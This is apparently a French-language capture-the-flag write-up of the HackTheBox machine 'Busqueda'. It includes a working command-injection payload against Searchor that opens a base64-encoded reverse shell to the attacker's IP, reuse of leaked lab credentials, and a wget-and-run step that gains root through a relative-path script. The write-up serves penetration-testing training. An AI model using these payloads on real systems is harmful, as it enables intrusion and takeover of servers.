---
title: Busqueda - Easy (Linux)
categories:
- Write-up
- HackTheBox
tags:
- hack-the-box
- linux
- htb
- web
---

### Nmap

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4fe3a667a227f9118dc30ed773a02c28 (ECDSA)
|_  256 816e78766b8aea7d1babd436b7f8ecc4 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-title: Searcher
| http-server-header: 
|   Apache/2.4.52 (Ubuntu)
|_  Werkzeug/2.1.2 Python/3.10.6
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

On voit que le site tourne sous apache. Que c'est probablement un site flask.

## Le site.

Le site est un site de recherche. Après un simple ctrl + u on voit qu'il est basé sur un projet "searchor".

On va sur internet et, muni de la version, on tombe directement sur une vulnérabilité.

Le projet utilise la fonction très très dangereuse "eval", ce qui nous permet d'exécuter n'importe quelle commande sur le serveur, via une SSTI, en commentant le reste du code source.

```bash
curl -s -X POST http://searcher.htb/search -d "engine=Google&query=',__import__('os').system('echo YmFzaCAgLWMgJ2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNzQvNDI0MiAwPiYxJw==|base64 -d|bash -i'))#toto"
```

Source : https://github.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection/blob/main/exploit.sh

On obtient donc un reverse shell et le premier flag.

## Élévation de privilèges.

```bash
[user]
        email = cody@searcher.htb
        name = cody
[core]
        hooksPath = no-hooks


drwxr-x--- 8 root root 4096 Apr  3 15:04 /opt/scripts/.git
drwxr-xr-x 8 www-data www-data 4096 Jun  8 12:28 /var/www/app/.git
```

Il n'y a rien avec pspy. Par contre on voit qu'il y a gitea en regardant les sous domaines.

Après plusieurs recherches, il s'avère qu'il faut avoir un mot de passe car sans cela on ne peut rien faire.

### Mot de passe de svc.

Il faut chercher dans le dossier .git. Dedans il y a un mot de passe qu'on peut réutiliser.

svc:jh1usoih2bkjaspwe92


### Élévation de privilèges : bis

Munis de crédits valides, nous pouvons maintenant réellement nous attaquer à l'élévation de privilèges.


La première chose que nous essayons c'est `sudo -l` :

```bash
svc@busqueda:~$ sudo -l
[sudo] password for svc: 
Matching Defaults entries for svc on busqueda:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User svc may run the following commands on busqueda:
    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *
    ```

=> On peut donc exécuter un script python avec les droits root.

Si on essaye ce script, nous avons trois commandes de disponibles :

```bash
svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py *
Usage: /opt/scripts/system-checkup.py <action> (arg1) (arg2)

     docker-ps     : List running docker containers
     docker-inspect : Inpect a certain docker container
     full-checkup  : Run a full system checkup
     ```

- `docker-ps`: analogue au vrai `docker ps`, va nous donner des informations sur les containers docker qui tournent.
- `docker-inspect`: idem, va nous donner des informations détaillées sur tel ou tel container.
- `full-checkup`: va faire un check-up un peu nullos.

docker-inspect :

```bash
svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-ps
CONTAINER ID   IMAGE                COMMAND                  CREATED        STATUS          PORTS                                             NAMES
960873171e2e   gitea/gitea:latest   "/usr/bin/entrypoint…"   5 months ago   Up 16 minutes   127.0.0.1:3000->3000/tcp, 127.0.0.1:222->22/tcp   gitea
f84a6b33fb5a   mysql:8              "docker-entrypoint.s…"   5 months ago   Up 16 minutes   127.0.0.1:3306->3306/tcp, 33060/tcp               mysql_db
```

On a donc deux containers. Le premier est gitea, qu'on avait déjà croisé en lisant /etc/hosts.

Le second un container mysql.

Le site de gitea est accessible via "gitea.searcher.htb". Il s'agit d'une instance du logiciel de gestion de projet.

On peut s'y connecter en testant plusieurs user de croisés :

svc:jh1usoih2bkjaspwe92
administrator:jh1usoih2bkjaspwe92 (c'est lui qui a push l'appli searcher)
cody:jh1usoih2bkjaspwe92 (on chope le nom en lisant .gitconfig dans le /home de svc)

Le dernier fonctionne, sauf qu'il n'est pas très intéressant.


La commande docker-inspect va nous aider à rendre le tout beaucoup plus intéressant :

```bash
svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect {{.Config}} gitea
{960873171e2e   false false false map[22/tcp:{} 3000/tcp:{}] false false false [USER_UID=115 USER_GID=121 GITEA__database__DB_TYPE=mysql GITEA__database__HOST=db:3306 GITEA__database__NAME=gitea GITEA__database__USER=gitea GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin USER=git GITEA_CUSTOM=/data/gitea] [/bin/s6-svscan /etc/s6] <nil> false gitea/gitea:latest map[/data:{} /etc/localtime:{} /etc/timezone:{}]  [/usr/bin/entrypoint] false  [] map[com.docker.compose.config-hash:e9e6ff8e594f3a8c77b688e35f3fe9163fe99c66597b19bdd03f9256d630f515 com.docker.compose.container-number:1 com.docker.compose.oneoff:False com.docker.compose.project:docker com.docker.compose.project.config_files:docker-compose.yml com.docker.compose.project.working_dir:/root/scripts/docker com.docker.compose.service:server com.docker.compose.version:1.29.2 maintainer:maintainers@gitea.io org.opencontainers.image.created:2022-11-24T13:22:00Z org.opencontainers.image.revision:9bccc60cf51f3b4070f5506b042a3d9a1442c73d org.opencontainers.image.source:https://github.com/go-gitea/gitea.git org.opencontainers.image.url:https://github.com/go-gitea/gitea]  <nil> []}

svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect {{.Config}} mysql_db
{f84a6b33fb5a   false false false map[3306/tcp:{} 33060/tcp:{}] false false false [MYSQL_ROOT_PASSWORD=jI86kGUuj87guWr3RyF MYSQL_USER=gitea MYSQL_PASSWORD=yuiu1hoiu4i5ho1uh MYSQL_DATABASE=gitea PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin GOSU_VERSION=1.14 MYSQL_MAJOR=8.0 MYSQL_VERSION=8.0.31-1.el8 MYSQL_SHELL_VERSION=8.0.31-1.el8] [mysqld] <nil> false mysql:8 map[/var/lib/mysql:{}]  [docker-entrypoint.sh] false  [] map[com.docker.compose.config-hash:1b3f25a702c351e42b82c1867f5761829ada67262ed4ab55276e50538c54792b com.docker.compose.container-number:1 com.docker.compose.oneoff:False com.docker.compose.project:docker com.docker.compose.project.config_files:docker-compose.yml com.docker.compose.project.working_dir:/root/scripts/docker com.docker.compose.service:db com.docker.compose.version:1.29.2]  <nil> []}
```

On a deux mots de passe qui sont exposés. On va pouvoir utiliser l'un des deux pour se connecter en tant qu'administrateur sur l'instance gitea.

Dans cette instance, on dispose des scripts qui sont présents dans le dossier /opt/scripts.

Dont celui exécutable avec les droits root.

La chose que l'on remarque quasi immédiatement, c'est le script full-checkup.sh est exécuté via un chemin d'accès relatif.

On peut donc créer notre propre script avec notre reverse shell dedans.

```bash
svc@busqueda:~$ wget http://10.10.14.74:4545/full-checkup.sh && chmod +x full-checkup.sh && sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
--2023-06-12 11:13:44--  http://10.10.14.74:4545/full-checkup.sh
Connecting to 10.10.14.74:4545... connected.
HTTP request sent, awaiting response... 200 OK
Length: 250 [application/x-sh]
Saving to: ‘full-checkup.sh’

full-checkup.sh                                            100%[========================================================================================================================================>]     250  --.-KB/s    in 0s      

2023-06-12 11:13:44 (32.4 MB/s) - ‘full-checkup.sh’ saved [250/250]
```

Terminé !
